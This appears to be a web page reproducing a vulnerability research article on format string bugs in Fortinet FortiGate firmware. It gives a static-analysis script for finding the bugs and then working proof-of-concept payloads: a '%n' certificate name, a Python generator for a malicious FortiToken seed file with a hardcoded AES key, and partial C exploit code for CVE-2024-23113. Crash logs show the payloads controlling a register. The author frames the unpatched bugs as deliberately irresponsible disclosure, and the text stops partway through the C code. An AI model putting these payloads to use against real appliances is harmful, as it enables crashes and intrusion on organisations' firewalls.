@@ -1,0 +1,370 @@
+<html>
+	<head>
+		<title>OpenCompiled.oeg</title>
+		<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Page Title</title>
+    <link rel="stylesheet" href="../index.css">
+	</head>
+
+<body>
+
+	<h1><a href="../index.html" class="header">Open Compiled</a></h1>
+	<a href="../index.html"><img alt="tux" src="../images/tux.webp" width="50px" style="float:right"/></a>
+	<h4>Advancing the Linux Kernel: Performance, Scalability, and Security for the Future of High-Performance Computing</h4>
+	
+	<hr/>
+
+<h1 id="long-live-format-strings">Long Live Format Strings</h1>
+<h2 id="content-table">Content table</h2>
+<ul>
+	<li><a href="#0-introduction">Introduction</a></li>
+	<li><a href="#1-finding-format-string-bugs">Finding Format String Bugs</a></li>
+	<li><a href="#2-beating-a-dead-firewall">Beating a Dead Firewall</a></li>
+</ul>
+<h2 id="0-introduction">0 - Introduction</a></h2>
+<p>Format string attacks should be dead. glibc&#39;s FORTIFY_SOURCE was released
+nearly 20 years ago. It&#39;s enabled by default. Vulnerabilities are trivial 
+to detect with static source code analysis. You have to be actively trying 
+to make a vulnerable piece of software. And yet, despite the existence of 
+foolproof protections, we still see multi-billion dollar companies ship 
+code with obvious format string vulnerabilities.</p>
+<p>This article will consist of a few lines of code and a few boring 0-day&#39;s,
+just to keep the reader interested.</p>
+<h2 id="1-finding-format-string-bugs">1 - Finding Format String Bugs</h2>
+<p>Most format strings are hardcoded, or at least come from a small set of 
+possible values. The exceptions to this pattern are what introduce format
+string bugs. Modern reverse engineering tools make it incredibly easy to 
+filter format string function calls down to the 1% of exceptions. Although 
+there are better scripts out there, this simple Binary Ninja script was 
+good enough to find a few quick 0days</p>
+<pre><code class="lang-python">  fns={
+    <span class="hljs-string">"printf"</span>:<span class="hljs-number">0</span>,
+    <span class="hljs-string">"fprintf"</span>:<span class="hljs-number">1</span>,
+    <span class="hljs-string">"dprintf"</span>:<span class="hljs-number">1</span>,
+    <span class="hljs-string">"sprintf"</span>:<span class="hljs-number">1</span>,
+    <span class="hljs-string">"snprintf"</span>:<span class="hljs-number">2</span>,
+    <span class="hljs-string">"vprintf"</span>:<span class="hljs-number">0</span>,
+    <span class="hljs-string">"vfprintf"</span>:<span class="hljs-number">1</span>,
+    <span class="hljs-string">"vsprintf"</span>:<span class="hljs-number">1</span>,
+    <span class="hljs-string">"vsnprintf"</span>:<span class="hljs-number">2</span>,
+  }
+
+  def check(<span class="hljs-function"><span class="hljs-keyword">function</span>,<span class="hljs-title">arg</span>):</span>
+      <span class="hljs-keyword">for</span> caller in <span class="hljs-function"><span class="hljs-keyword">function</span>.<span class="hljs-title">caller_sites</span>:</span>
+          <span class="hljs-keyword">try</span>: inst=caller.mlil.ssa_form
+          except KeyboardInterrupt <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>: <span class="hljs-keyword">return</span>
+          except Exception: <span class="hljs-keyword">continue</span>
+          <span class="hljs-keyword">if</span> inst <span class="hljs-keyword">is</span> None: <span class="hljs-keyword">continue</span>
+          op=inst.operation
+          <span class="hljs-keyword">if</span> op in (MediumLevelILOperation.MLIL_CALL_SSA,
+              MediumLevelILOperation.MLIL_CALL_UNTYPED_SSA,
+              MediumLevelILOperation.MLIL_TAILCALL_SSA):
+              <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(inst.params)&lt;arg+<span class="hljs-number">1</span>: <span class="hljs-keyword">continue</span>
+              <span class="hljs-keyword">if</span> inst.dest.constant!=<span class="hljs-function"><span class="hljs-keyword">function</span>.<span class="hljs-title">lowest_address</span>: <span class="hljs-title">continue</span></span>
+          <span class="hljs-keyword">else</span>: <span class="hljs-keyword">continue</span>
+          param=inst.params[arg]
+          possible=param.possible_values
+          <span class="hljs-keyword">if</span> possible.<span class="hljs-built_in">type</span> in (RegisterValueType.StackFrameOffset,
+              RegisterValueType.UndeterminedValue):
+              yield inst.address
+
+  <span class="hljs-keyword">for</span> <span class="hljs-keyword">f</span> in <span class="hljs-keyword">function</span><span class="hljs-variable">s:</span>
+      <span class="hljs-keyword">print</span>(<span class="hljs-string">"-----"</span>+<span class="hljs-keyword">f</span>+<span class="hljs-comment">"-----)</span>
+      <span class="hljs-keyword">for</span> ff in bv.get_functions_by_name(<span class="hljs-keyword">f</span>):
+          <span class="hljs-keyword">for</span> i in check(ff, fns[<span class="hljs-keyword">f</span>]):
+              <span class="hljs-keyword">print</span>(hex(i))
+</code></pre>
+<p>Put simply, this script checks for every call to a printf-family function,
+then checks if the format argument is a constant value, or a stack buffer. 
+There are, of course, plenty of better tools to perform this kind of basic 
+static analysis, but I want to make the point that you don&#39;t have to be a 
+skilled exploit dev to find format string bugs in a poorly made piece of 
+software.</p>
+<h2 id="2-beating-a-dead-firewall">2 - Beating a Dead Firewall</h2>
+<p>Running that script against something very secure like the Fortinet 
+/bin/init binary, you could easily rack up enough CVEs to pad your resume.
+Luckily for you, and in the spirit of irresponsible disclosure, I am 
+publishing a few crashes just for Phrack! Please enjoy two 0day 
+unauthenticated bugs, and one unauthenticated n-day:</p>
+<h3 id="2-1-certificate-import">2.1 - Certificate Import</h3>
+<p>I heard somewhere that PKI is important. I wonder what happens if I add 
+some %n&#39;s to the certificate name on import...</p>
+<pre><code class="lang-text">  <span class="hljs-number">1.</span> System -&gt; Certificates -&gt; Create/Import -&gt; Certificate
+     -&gt; Import Certificate -&gt; Certificate
+  <span class="hljs-number">2.</span> Add a valid certificate <span class="hljs-keyword">file</span> and key <span class="hljs-keyword">file</span>
+  <span class="hljs-number">3.</span> Set the certificate name to %4919$1$c%n%n%n%n%n%n%n%n%n
+  <span class="hljs-number">4.</span> Click create
+</code></pre>
+<p>Internal server error? Let&#39;s check the crash log.</p>
+<pre><code class="lang-text">  <span class="hljs-meta"># diagnose debug crashlog read</span>
+
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> firmware FortiGate-VM64 v7<span class="hljs-number">.2</span><span class="hljs-number">.7</span>,build1577b1577,<span class="hljs-number">240131</span> (GA.M) (Release)
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> application httpsd
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> *** signal <span class="hljs-number">11</span> (Segmentation fault) received ***
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> Register dump:
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> RAX: <span class="hljs-number">0000000010</span>c9dde0   RBX: <span class="hljs-number">0000000010</span>caf09c
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> RCX: <span class="hljs-number">00007f</span>ffd366e008   RDX: <span class="hljs-number">00007f</span>132d45bfc0
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> R08: <span class="hljs-number">0000000010</span>c97050   R09: <span class="hljs-number">00007f</span>132d49abe0
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> R10: <span class="hljs-number">0000000000004000</span>   R11: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> R12: <span class="hljs-number">00007f</span>ffd3668570   R13: <span class="hljs-number">0000000000001337</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> R14: <span class="hljs-number">0000000000000009</span>   R15: <span class="hljs-number">00000000000006</span>d9
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> RSI: <span class="hljs-number">00007f</span>ffd366a288   RDI: <span class="hljs-number">00007f</span>ffd366e000
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> RBP: <span class="hljs-number">00007f</span>ffd3668dd0   RSP: <span class="hljs-number">00007f</span>ffd3668480
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> RIP: <span class="hljs-number">00007f</span>132d346c6c   EFLAGS: <span class="hljs-number">0000000000010212</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> CS:  <span class="hljs-number">0033</span>   FS: <span class="hljs-number">0000</span>   GS: <span class="hljs-number">0000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> Trap: <span class="hljs-number">000000000000000</span>e   Error: <span class="hljs-number">0000000000000004</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> OldMask: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> CR2: <span class="hljs-number">00007f</span>ffd366e000
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> stack: <span class="hljs-number">0x7fffd3668480</span> - <span class="hljs-number">0x7fffd366d490</span> 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> Backtrace:
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x7f132d346c6c</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">00064</span>c6c
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x7f132d34905d</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0006705</span>d
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x7f132d35c826</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0007</span>a826
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x7f132d335d42</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__snprintf+<span class="hljs-number">0x00000092</span>) liboffset <span class="hljs-number">00053</span>d42
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x0222351b</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x02223a65</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00ddb567</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00d08dc4</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00d09419</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00d0b547</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00d0d01d</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00caeef9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00e9984a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_handler+<span class="hljs-number">0x0000004a</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00e9a0a6</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_invoke_handler+<span class="hljs-number">0x000000c6</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00ee1ec9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00ee2111</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_process_request+<span class="hljs-number">0x00000021</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eda23f</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00e9e0aa</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_process_connection+<span class="hljs-number">0x0000004a</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eb3cb7</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eb3f86</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eb4174</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eb47ad</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eafa51</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_mpm+<span class="hljs-number">0x00000061</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00eaf586</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00449f6f</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x0044f498</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x0044fc8a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x004524af</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x00452dd9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x7f132d305deb</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__libc_start_main+<span class="hljs-number">0x000000eb</span>) liboffset <span class="hljs-number">00023</span>deb
+  <span class="hljs-params">&lt;<span class="hljs-number">02946</span>&gt;</span> [<span class="hljs-number">0x004450da</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd
+</code></pre>
+<p>R13 contains 0x1337, which just so happens to be the exact number of bytes
+we just printed with %4919$1$c. Looks like a vuln to me!</p>
+<h3 id="2-2-fortitoken-import">2.2 - FortiToken import</h3>
+<p>MFA solves all security problems, and Fortinet makes MFA easy with 
+FortiTokens. Let&#39;s generate some FortiToken seed files:</p>
+<pre><code class="lang-python">  ----- ftk.py -----
+  <span class="hljs-built_in">import</span> base64
+  from cryptography.hazmat.primitives.ciphers <span class="hljs-built_in">import</span> Cipher, algorithms, modes
+  from cryptography.hazmat.backends <span class="hljs-built_in">import</span> default_backend
+  <span class="hljs-comment"># lol hardcoded key</span>
+  <span class="hljs-attr">FTK_KEY="3F2FE4F6E40B53CFF0B5948993F4D4AB369C7F0375FDC92D64CB3E8880FFAE4E"</span>
+  <span class="hljs-attr">FTK_KEY=bytes.fromhex(FTK_KEY)</span>
+  <span class="hljs-attr">format_str=b'%4919$1$c%n%n%n</span> '
+  <span class="hljs-attr">iv=b'\0'*16</span>
+  <span class="hljs-attr">a=Cipher(algorithms.AES(FTK_KEY),</span> modes.CBC(iv), <span class="hljs-attr">backend=default_backend())</span>
+  <span class="hljs-attr">e=a.encryptor()</span>
+  <span class="hljs-attr">ct=e.update(format_str)</span>
+  <span class="hljs-attr">ciphertext=base64.b64encode(ct).decode()</span>
+  print(f<span class="hljs-string">"FTK00000000000EA,{ciphertext},{iv.hex()}"</span>)
+  ------ ftk.py -----
+</code></pre>
+<pre><code class="lang-bash">  $ python3 ftk<span class="hljs-selector-class">.py</span> &gt; poc.ftk
+</code></pre>
+<p>Importing a seed file is easy:</p>
+<pre><code class="lang-text">  <span class="hljs-number">1</span>. U<span class="hljs-function"><span class="hljs-title">ser</span> &amp; Authentication -&gt;</span> F<span class="hljs-function"><span class="hljs-title">ortiTokens</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-title">reate</span> New -&gt;</span> I<span class="hljs-function"><span class="hljs-title">mport</span> -&gt;</span> Seed File
+  <span class="hljs-number">2</span>. Upload poc.ftk
+</code></pre>
+<p>Hmm... what&#39;s this? Another error? Let&#39;s see what the crashlog has to say:</p>
+<pre><code class="lang-text">  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> firmware FortiGate-VM64 v7<span class="hljs-number">.2</span><span class="hljs-number">.7</span>,build1577b1577,<span class="hljs-number">240131</span> (GA.M) (Release)
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> application httpsd
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> *** signal <span class="hljs-number">11</span> (Segmentation fault) received ***
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> Register dump:
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> RAX: <span class="hljs-number">0000000010</span>da2830   RBX: <span class="hljs-number">0000000010</span>db020c
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> RCX: <span class="hljs-number">00007f</span>fd536af008   RDX: <span class="hljs-number">00007f</span>d3f60e3fc0
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> R08: <span class="hljs-number">0000000010</span>d981c0   R09: <span class="hljs-number">00007f</span>d3f6122be0
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> R10: <span class="hljs-number">0000000000000010</span>   R11: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> R12: <span class="hljs-number">00007f</span>fd536a7900   R13: <span class="hljs-number">0000000000001337</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> R14: <span class="hljs-number">0000000000000004</span>   R15: <span class="hljs-number">0000000000000</span>a67
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> RSI: <span class="hljs-number">00007f</span>fd536a9618   RDI: <span class="hljs-number">00007f</span>fd536af000
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> RBP: <span class="hljs-number">00007f</span>fd536a8160   RSP: <span class="hljs-number">00007f</span>fd536a7810
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> RIP: <span class="hljs-number">00007f</span>d3f5fcec6c   EFLAGS: <span class="hljs-number">0000000000010212</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> CS:  <span class="hljs-number">0033</span>   FS: <span class="hljs-number">0000</span>   GS: <span class="hljs-number">0000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> Trap: <span class="hljs-number">000000000000000</span>e   Error: <span class="hljs-number">0000000000000004</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> OldMask: <span class="hljs-number">0000000000000000</span>
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> CR2: <span class="hljs-number">00007f</span>fd536af000
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> stack: <span class="hljs-number">0x7ffd536a7810</span> - <span class="hljs-number">0x7ffd536acfc0</span> 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> Backtrace:
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x7fd3f5fcec6c</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">00064</span>c6c
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x7fd3f5fd105d</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0006705</span>d
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x7fd3f5fe4826</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span>  liboffset 
+  <span class="hljs-number">0007</span>a826
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x7fd3f5fbdd42</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__snprintf+<span class="hljs-number">0x00000092</span>) liboffset <span class="hljs-number">00053</span>d42
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x0290048a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00de6fbd</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00d08dc4</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00d09419</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00d0b547</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00d0d01d</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00caeef9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00e9984a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_handler+<span class="hljs-number">0x0000004a</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00e9a0a6</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_invoke_handler+<span class="hljs-number">0x000000c6</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00ee1ec9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00ee2111</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_process_request+<span class="hljs-number">0x00000021</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eda23f</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00e9e0aa</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_process_connection+<span class="hljs-number">0x0000004a</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eb3cb7</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eb3f86</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eb3fcb</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eb48e5</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eafa51</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd (ap_run_mpm+<span class="hljs-number">0x00000061</span>) 
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00eaf586</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00449f6f</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x0044f498</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x0044fc8a</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x004524af</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x00452dd9</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd  
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x7fd3f5f8ddeb</span>] =&gt; <span class="hljs-meta-keyword">/usr/</span>lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span> 
+  (__libc_start_main+<span class="hljs-number">0x000000eb</span>) liboffset <span class="hljs-number">00023</span>deb
+  <span class="hljs-params">&lt;<span class="hljs-number">02664</span>&gt;</span> [<span class="hljs-number">0x004450da</span>] =&gt; <span class="hljs-meta-keyword">/bin/</span>httpsd
+</code></pre>
+<p>Unsurprisingly, this crash looks almost identical to the last one. The only
+difference is the stack trace, which shows</p>
+<pre><code class="lang-text">  (__snprintf+<span class="hljs-number">0x00000092</span>) liboffset <span class="hljs-number">00053</span>d42
+  [<span class="hljs-number">0x0290048a</span>] =&gt; /bin/httpsd
+  [<span class="hljs-number">0x00de6fbd</span>] =&gt; /bin/httpsd
+  [<span class="hljs-number">0x00d08dc4</span>] =&gt; /bin/httpsd
+</code></pre>
+<p>rather than </p>
+<pre><code class="lang-text">  (__snprintf+<span class="hljs-number">0x00000092</span>) liboffset <span class="hljs-number">00053</span>d42
+  [<span class="hljs-number">0x0222351b</span>] =&gt; /bin/httpsd
+  [<span class="hljs-number">0x02223a65</span>] =&gt; /bin/httpsd
+  [<span class="hljs-number">0x00ddb567</span>] =&gt; /bin/httpsd
+</code></pre>
+<h3 id="2-3-cve-2024-23113">2.3 - CVE-2024-23113</h3>
+<p>Does CVE-2024-23113 sound too complicated? In reality, it&#39;s as shrimple as</p>
+<pre><code class="lang-c">  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/ssl.h&gt;</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/err.h&gt;</span></span>
+
+  <span class="hljs-keyword">char</span> *payload=\
+  <span class="hljs-string">"reply 200\r\n"</span>\
+  <span class="hljs-string">"request=auth\r\n"</span>\
+  <span class="hljs-string">"mgmtip=%270441$1$c%n%n%n%n%n%n%n%n%n%n\r\n"</span>\
+  <span class="hljs-string">"\r\n"</span>;
+
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HOST <span class="hljs-meta-string">"69.69.69.69"</span></span>
+  <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT 541</span>
